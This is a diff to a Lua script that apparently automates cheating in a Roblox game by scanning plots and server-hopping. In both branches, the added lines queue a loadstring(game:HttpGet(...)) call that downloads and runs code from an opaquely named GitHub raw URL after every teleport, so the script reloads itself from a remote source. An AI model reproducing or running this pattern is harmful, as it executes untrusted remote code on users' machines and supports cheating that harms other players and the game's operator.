@@ -350,12 +350,70 @@ local function scanAllPlots()
         -- Wait a bit before server hopping
         wait(3)
         
-        -- Server hop
-        TeleportService:Teleport(109983668079237, Players.LocalPlayer)
+        -- Queue script to auto-execute after server hop
+        queue_on_teleport([[
+            wait(5)
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/pjglizzyoyogz-bot/ewrgpoiej/refs/heads/main/awe2r34t"))()
+        ]])
+        
+        -- Server hop with retry logic
+        local attempts = 0
+        local maxAttempts = 10
+        repeat
+            attempts = attempts + 1
+            print("Server hop attempt " .. attempts .. "/" .. maxAttempts)
+            local success, error = pcall(function()
+                TeleportService:Teleport(109983668079237, Players.LocalPlayer)
+            end)
+            if not success then
+                warn("Teleport failed: " .. tostring(error))
+                if attempts < maxAttempts then
+                    print("Retrying in 3 seconds...")
+                    wait(3)
+                end
+            else
+                print("Teleport initiated successfully!")
+                break
+            end
+        until attempts >= maxAttempts
+        
+        if attempts >= maxAttempts then
+            print("All teleport attempts failed, continuing scan...")
+        end
     else
         print("No brainrots found, server hopping...")
         wait(2)
-        TeleportService:Teleport(109983668079237, Players.LocalPlayer)
+        
+        -- Queue script to auto-execute after server hop
+        queue_on_teleport([[
+            wait(5)
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/pjglizzyoyogz-bot/ewrgpoiej/refs/heads/main/awe2r34t"))()
+        ]])
+        
+        -- Server hop with retry logic
+        local attempts = 0
+        local maxAttempts = 10
+        repeat
+            attempts = attempts + 1
+            print("Server hop attempt " .. attempts .. "/" .. maxAttempts)
+            local success, error = pcall(function()
+                TeleportService:Teleport(109983668079237, Players.LocalPlayer)
+            end)
+            if not success then
+                warn("Teleport failed: " .. tostring(error))
+                if attempts < maxAttempts then
+                    print("Retrying in 3 seconds...")
+                    wait(3)
+                end
+            else
+                print("Teleport initiated successfully!")
+                break
+            end
+        until attempts >= maxAttempts
+        
+        if attempts >= maxAttempts then
+            print("All teleport attempts failed, continuing scan...")
+        end
     end
 end
 
